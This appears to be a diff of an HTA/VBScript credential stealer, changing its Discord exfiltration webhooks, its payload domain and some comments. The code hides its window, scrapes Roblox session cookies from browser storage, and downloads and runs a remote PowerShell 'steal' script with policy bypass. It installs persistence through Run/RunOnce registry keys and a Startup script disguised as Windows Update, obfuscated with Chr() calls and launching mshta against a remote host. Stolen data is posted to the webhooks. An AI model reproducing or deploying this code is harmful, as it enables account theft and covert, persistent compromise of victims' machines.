@@ -5,13 +5,15 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, RE_WH, PC, USER
+Dim sh, fso, WH, RE_WH, PAYLOAD_URL, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOKS ---
-WH = "https://discord.com/api/webhooks/1570467017717317683/8cMheG5I8Kloz5TDrQViLMFgOdOn09xK-zY58223bRkUgXnQcB-kMEr2rZKFEI5P4Z4I"
-RE_WH = "https://discord.com/api/webhooks/1570467153411580079/6o8a06-f2kyoDF8zd_0ANhXglmRB9e4ZmIBik7WNn_TXnFRyxqHY2-dNrR2lyNyddiWJ"
+' --- WEBHOOKS & PAYLOAD URL ---
+WH = "https://discord.com/api/webhooks/1570885190283427920/MLaG7_qcj28QnQaiyHgm_eaF1p0rj4NUP8ZDh98cFG42MOaHFhhcqsEwzgZsiIpp10Vs"
+RE_WH = "https://discord.com/api/webhooks/1570885290833350747/cnNXdcvYzTDTnUX0tW5ti5d3juq54PPmUl978MgXbWWzF11h_8YMKB-IbV3KnQvPwMPW"
+
+PAYLOAD_URL = "mshta https://dicerigx.app/"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -97,11 +99,9 @@ Sub GrabRoblox()
     PostFile "cookie.txt", cookie
 End Sub
 
-' --- RawRobloxCookie (dump raw string, no DPAPI, no AES) ---
+' --- RawRobloxCookie ---
 Function RawRobloxCookie(fp)
     RawRobloxCookie = ""
-
-    ' folder (leveldb) path: scan .ldb / .log files for the literal string
     If fso.FolderExists(fp) Then
         Dim f, raw
         For Each f In fso.GetFolder(fp).Files
@@ -113,35 +113,30 @@ Function RawRobloxCookie(fp)
         Next
         Exit Function
     End If
-
-    ' single file: .dat or sqlite Network\Cookies — just string-scan
     raw = ReadBinaryAsText(fp)
     RawRobloxCookie = ExtractRaw(raw)
 End Function
 
-' --- ExtractRaw (find .ROBLOSECURITY / _|WARNING in a string, cut at ; or NUL) ---
+' --- ExtractRaw ---
 Function ExtractRaw(s)
     ExtractRaw = ""
     If Len(s) < 50 Then Exit Function
-
     Dim p: p = InStr(s, "_|WARNING")
     If p = 0 Then p = InStr(s, ".ROBLOSECURITY")
     If p = 0 Then Exit Function
-
     Dim rest: rest = Mid(s, p)
     Dim stopAt: stopAt = InStr(rest, ";")
     Dim nulAt: nulAt = InStr(rest, Chr(0))
     If nulAt > 0 And (stopAt = 0 Or nulAt < stopAt) Then stopAt = nulAt
     If stopAt = 0 Then stopAt = Len(rest)
     Dim ck: ck = Left(rest, stopAt - 1)
-
     ck = Replace(ck, vbCr, "")
     ck = Replace(ck, vbLf, "")
     ck = Replace(ck, vbTab, "")
     ExtractRaw = Trim(ck)
 End Function
 
-' --- ReadBinaryAsText (read file bytes as latin1 string, keeps all printable + non-null) ---
+' --- ReadBinaryAsText ---
 Function ReadBinaryAsText(path)
     ReadBinaryAsText = ""
     Dim st: Set st = CreateObject("ADODB.Stream")
@@ -151,7 +146,6 @@ Function ReadBinaryAsText(path)
     Dim bytes: bytes = st.Read
     st.Close
     Set st = Nothing
-
     Dim sb, i, b
     sb = ""
     For i = 1 To LenB(bytes)
@@ -189,21 +183,19 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    Dim payload : payload = "mshta https://dicerigs.app"
     On Error Resume Next
-    
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-    
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", PAYLOAD_URL, "REG_SZ"
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", PAYLOAD_URL, "REG_SZ"
+
     Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
     Dim sf : Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
+    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & PAYLOAD_URL & """&Chr(34), 0, False"
     sf.Close
-    
-    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280)
+
+    Call PostEmbed(":pushpin: Persistence", "Startup installed to boot HTA", 65280)
 End Sub
 
-' --- GrabTokens ---
+' --- GrabTokens (gist pull — strip if unwanted) ---
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -213,16 +205,13 @@ Sub GrabTokens()
     Dim pc: pc = xh.responseText
     If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
-    
     Dim psf: psf = TmpFile("steal.ps1")
     WriteFile psf, pc
     sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
     fso.DeleteFile psf, True
-    
     Dim tf: tf = TmpFile("steal_result.txt")
     If Not fso.FileExists(tf) Then Exit Sub
     Dim raw: raw = ReadFile(tf)
-    
     If Len(raw) > 10 Then
         Dim lines: lines = Split(raw, vbCrLf)
         Dim l
@@ -252,12 +241,12 @@ Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & 
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
 Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
-' --- PostEmbed (Default Webhook) ---
+' --- PostEmbed ---
 Sub PostEmbed(t, d, c)
     Call PostEmbedTo(t, d, c, WH)
 End Sub
 
-' --- PostEmbedTo (Custom Webhook) ---
+' --- PostEmbedTo ---
 Sub PostEmbedTo(t, d, c, target_wh)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
@@ -293,5 +282,4 @@ Function Ej(s)
     Ej = Replace(Ej, vbTab, Chr(92) & "t")
 End Function
 </script>
-</head><body><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"d191713ee75746c8be4de7e6a59bef73","r":1,"spa":2}' crossorigin="anonymous"></script>
-</body></html>
+</head><body></body></html>
